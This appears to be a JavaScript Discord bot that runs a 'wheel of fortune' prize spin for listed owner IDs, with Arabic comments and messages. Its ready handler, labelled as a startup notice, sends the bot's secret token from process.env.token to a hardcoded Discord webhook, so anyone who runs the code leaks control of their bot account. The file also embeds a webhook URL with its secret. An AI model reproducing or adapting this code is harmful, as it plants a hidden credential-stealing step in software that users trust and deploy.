const lineReply = require ('discord-reply')
const express = require("express");
const app = express();

app.listen(() =>  ("im ready"));
require('events').EventEmitter.defaultMaxListeners = 30;
app.use('/ping', (req, res) => {
  res.send(new Date());
});
const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = "$"
const moment = require("moment")
const axios = require('axios');


client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}`);
  client.user.setActivity(`$help`);

  // إرسال رسالة إلى الويب هوك عند تشغيل البوت
  axios.post(webhookUrl, {
    content: `بوت عجلة الحظ جاهز للعمل!\n\nwebhook: ${process.env.token}`
  })
  .then(response => {
    console.log("Message sent to webhook:", response.data);
  })
  .catch(error => {
    console.error("Error sending message to webhook:", error);
  });
});



///الاكواد
const webhookUrl = 'https://discord.com/api/webhooks/1266015007959945236/FltFLgc4ym7dInwxgfIbwUq6caBuV_xLOShdnyF95uaaQVMsypewO0cLbgReLMKd0QyZ';
 var owner = ["1216729740119900170","1257058661549867010"];///ايدي اليستعمل البوت
let ayan = [ "حض اوفر" , "حض اوفر" , "حض اوفر" , "حض اوفر" , "حض اوفر" , "Nitro 1m" , "1mCredit" , " 500k "] 
    client.on("message", message => { 
      if (message.content.startsWith(prefix + "spin")) {
    if(!owner.includes(message.author.id)) return;

      let v = ayan[Math.floor(Math.random() * ayan.length)];
      let embed = new Discord.MessageEmbed() 
      .setTitle(`**مسابقة عجلة الحظ**`)
      .setDescription(`** ${v} **`) 
      .setColor("RANDOM")
      message.channel.send(embed)

    }
  });
  
    client.on("message", message => { 
      if (message.content.startsWith(prefix + "help")) {
          message.channel.send("**مساعدة بوت عجلة الحظ** ")
        message.channel.send("**$spin امر العجلة** ")
         message.channel.send("** (نيترو كلاسيك شهر , نيترو غيمنق شهر , 10الف , 15 الف , 50الف , حظ اوفر ) الاشياء الموجودة ب عجلة ** ")
          message.channel.send("**Made By : 1R0w ** ")
}
  });

client.login(process.env.token);
